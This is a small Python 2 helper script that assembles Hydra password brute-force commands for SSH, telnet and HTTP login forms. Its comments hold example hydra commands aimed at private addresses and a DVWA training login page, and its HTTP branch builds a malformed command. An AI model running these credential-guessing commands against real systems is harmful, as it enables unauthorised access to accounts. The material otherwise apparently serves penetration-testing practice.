# hydra -L username.txt -P 500-worst-passwords.txt 10.10.10.10 ssh
# hydra -L username.txt  -P /usr/share/dirb/wordlists/small.txt 192.168.1.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V
import os


# TODO add http

def get_basic_command(ip, protocol, wordlist, url='/', form_parameters='username=^USER^&password=^PASS',
                      failed_login_msg='incorrect'):
    # Get the filename, equal to current path plus 'username.txt'
    username_file = os.path.dirname(os.path.abspath(__file__)) + '/username.txt'

    if protocol.lower() == 'http':
        # username_file, password_file,ip, url:form_parameters:failed_login_msg
        command = 'hydra -L {} -P {} {} {}:{}:{}'.format(
            username_file, wordlist, ip, url, form_parameters, failed_login_msg)

    else:
        command = 'hydra -L {} -P {} {} {}'.format(username_file, wordlist, ip, protocol)
    return command


if __name__ == '__main__':
    print get_basic_command('192.168.1.1', 'telnet', '/usr/share/wordlists/rockyou.txt')
    print get_basic_command('192.168.1.1', 'http', '/usr/share/wordlists/rockyou.txt', )
